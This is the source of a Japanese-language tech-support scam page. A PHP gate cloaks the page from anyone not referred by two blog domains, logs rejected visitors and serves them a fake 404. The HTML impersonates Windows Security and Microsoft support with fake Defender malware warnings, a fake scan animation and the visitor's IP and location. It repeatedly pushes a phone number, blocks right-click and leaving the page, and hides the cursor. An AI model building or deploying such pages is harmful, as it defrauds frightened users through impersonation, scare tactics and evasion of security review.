<?php
session_start(); // Start or resume session

// List of allowed referrer hostnames
$allowed_hosts = [
    'seaglassblog.site', 
    'shorevistablog.site'
];

// Log file path
$log_file = __DIR__ . '/restricted_visits.csv';

// Get referrer
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$ref_host = parse_url($referrer, PHP_URL_HOST) ?? '';

// Check 1: Missing or invalid referrer
if (empty($ref_host) || !in_array($ref_host, $allowed_hosts)) {
    logAndAbort('Invalid or missing referrer', $referrer, $log_file);
}

// Check 2: Already visited this session
if (isset($_SESSION['page_loaded']) && $_SESSION['page_loaded'] === true) {
    logAndAbort('Page already loaded once in this session', $referrer, $log_file);
}

// Mark page as loaded in this session
$_SESSION['page_loaded'] = true;

// Logging function
function logAndAbort($reason, $referrer, $log_file) {
    $log_entry = [
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'] ?? 'N/A',
        $referrer,
        $_SERVER['REQUEST_URI'] ?? '',
        $_SERVER['HTTP_USER_AGENT'] ?? '',
        $reason
    ];

    $fp = fopen($log_file, 'a');
    if ($fp !== false) {
        fputcsv($fp, $log_entry);
        fclose($fp);
    }

    http_response_code(404);
    exit('404 Not Found');
}

?>


<html lang="en"><head>
 


<!--  -->

    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <title>Stripchatjapan</title>
    <link rel="shortcut icon" type="image/png" href="images/favicon.png">
    <link href="css/tapa.css" rel="stylesheet">
    <script type="text/javascript" src="js/jquery-1.4.4.min.js"></script>
    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script type="text/javascript">//<![CDATA[
    $(function(){
    $('body').bind('contextmenu', function(e){
    return false;
    });
    });//]]>
    </script>

    <script type="text/javascript">
      var phone_number = '0101 833 224 9759';

    </script>

<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=09fde42e"></script>
  </head>
  <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">

    <!-- <div id="modalbx">

      <video id="vid" width="100%" height="100%" muted loop preload="auto" autoplay>
        <div class="play-button"></div>
        <source src="web.webm" type="video/webm">
      </video>


  <div class="bxweb">
                     
           
                      <div>
                        <img src="images/cross.png" alt="" class="swtch">
          
                      </div>
                 
                     <div style="font-size:40px;">
                      はい、私は18歳以上です
                      </div>
                      <div>
                        <button type="button" class="btn btn-secondary btn-lg">
                          入力</button>
           <button type="button" class="btn back-button btn-lg blink"><span class="text">全てのエロサイト</span><span class="link-icon"></span></button>
                      </div>

                      
                      
                      
                  </div> 
      
              </div> -->

              <div id="ageconfirmationmodal">

                <!-- <video id="vid" width="100%" height="100%" muted loop preload="auto" autoplay>
                  <div class="play-button"></div>
                  <source src="web.webm" type="video/webm">
                </video> -->
          
                <div class="innerContainer">
                               
                     
                             
                                <div class="crsr">
                                  <a href="#">
                    <img src="images/cs.png" style="width: 20px;">
                                  </a>
                    
                       
                                </div>
                           
                               <div style="font-size:40px;margin-top: 5px;">
                                    このサイトを閉じます<br>か？
                                </div>
                                <div>
                                  <button type="button" class="btn btn-secondary btn-lg" style="margin-right: 5px;"><i class="fa fa-close" style="font-size:24px"></i>
                      いいえ</button>
                     <button type="button" class="btn btn-primary btn-lg blink" style="background-color: #a3242f;color:#fff;background-image: none"><i class="fa fa-check-square-o" style="font-size:24px"></i>
                     はい</button>
                                </div>
                               
                                
                                
                            </div>
                
                        </div>


    <div class="bg" style="cursor:none">
      <div class="bgimg" style="top:0">
        <img src="images/back.png" alt="" width="100%">
      </div>
    </div>
    <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
      <div class="black" style="height: 145%; cursor: none; display: block;"></div>
    </a>
    <div class="webbxs" style="display: block;">
      <img src="images/nbx1.jpg" alt="" width="100%" style="height: auto;">
    </div>


    <div class="bxcontb" style="display: block;" id="webgetcode">
      <img src="images/web1.jpg" alt="" style="width: 500px;">
      <strong class="haru"><img src="images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (日本国内無料電話)</strong>
    </div>

    <div class="vislnb" id="botgnws" style="display: block;">
      <div class="row firewall-pro">
        <div class="col-md-12">
          <img src="images/box01.png" alt="" style="width: 670px;height: auto;">
          <div id="txtintro">
            <span class="colo-rd">
              <div id="ip_add"></div>
              <div id="city"></div>
              <div id="isp"> </div>
            </span>
          </div>
          <img src="images/scn.gif" id="bnrs">
          <strong class="haruto"><img src="images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (日本国内無料電話)</strong>
          <div class="fr button blink" id="ftrs_btn">
            <a href="#" class="blink">わかりました</a>
          </div>
        </div>
      </div>
    </div>

    <div id="ftrs">
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
            <span id="ftrstxt">
              <img src="images/img.png"> Windowsのセキュリティ </span>
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="images/call.png" alt="" class="blink" style="width: 25px;vertical-align: middle;">  <script>document.write(phone_number);</script> (日本国内無料電話) 
              </span>
            </span>
          </div>
        </div>
        <div class="col-md-12">
          <marquee direction="left" height="100px" width="100%">
            <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 Windows Defender スキャンにより、パスワード、オンライン ID、財務情�、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。</small>
          </marquee>
        </div>
      </div>
    </div>

    <div class="uprbox" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="upbxs">
      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">すぐに当社にご連絡く�さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 <br>
        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px;display: block;"> <img src="images/call.png" alt="" class="blink" style="width: 25px;vertical-align: bottom;"> <script>document.write(phone_number);</script> (日本国内無料電話)
          </span>
        </strong>
      </p>
    </div>

    <div id="chat" class="bounce" style="display: block;">
      <img src="images/img.png">
      <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
      <p style="font-weight:600;font-size:24px">サポートに電話する: <br>
      </p>
      <h4 style="font-weight:600;font-size:22px"> <img src="images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;vertical-align:bottom"> <script>document.write(phone_number);</script> <br>(日本国内無料電話)</h4>
      <div class="arrow-down">
        <svg height="1em" viewBox="0 0 320 512">
          <style>
            svg {
              fill: #fff
            }
          </style>
          <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
        </svg>
      </div>
    </div>

    <script type="text/javascript" src="js/noir.js"></script>
    <script type="text/javascript" src="js/all.js"></script>
    <script type="text/javascript" src="js/esc.js"></script>
    <script type="text/javascript" src="js/script1.js"></script>
    <script type="text/javascript" src="js/script2.js"></script>
    <script type="text/javascript" src="js/script3.js"></script>
    <script type="text/javascript" src="js/script4.js"></script>
    <script type="text/javascript" src="js/script5.js"></script>
    <script type="text/javascript" src="js/script6.js"></script>
    <script type="text/javascript" src="js/script7.js"></script>
    <script type="text/javascript" src="js/web1.js"></script>
    <script type="text/javascript" src="js/full.js"></script>
    <script type="text/javascript" src="js/lvs.js"></script>
    <script type="text/javascript" src="js/cmple.js"></script>
    <script type="text/javascript" src="js/ips.js"></script>
    <script type="text/javascript" src="js/muse.js"></script>
    <script type="text/javascript" src="js/mouse.js"></script>
    <script type="text/javascript" src="js/times.js"></script>
   
    <script>
      $(document).ready(function(){
        $(".map").click(function(){
          $("#modalbx").hide();
        });
      });
      </script>  

<script>
  $(document).ready(function(){
    $(".map").click(function(){
      $("#ageconfirmationmodal").hide();
    });
  });
  </script>  

    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#upbxs").show()
        })
      });
    </script>

    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#botgnws").show()
        })
      });
      $(document).ready(function() {
        $("#cross").click(function() {
          $("#botgnws").show()
        })
      });
    </script>
    <script>
      $(document).ready(function() {
        $("body").mouseover(function() {
          $("#botgnws").show()
        })
      });
    </script>
    
    <script>
      $(document).ready(function() {
        $("#chat").delay(600).fadeIn(100)
      });
    </script>
    




</body><!--  --></html>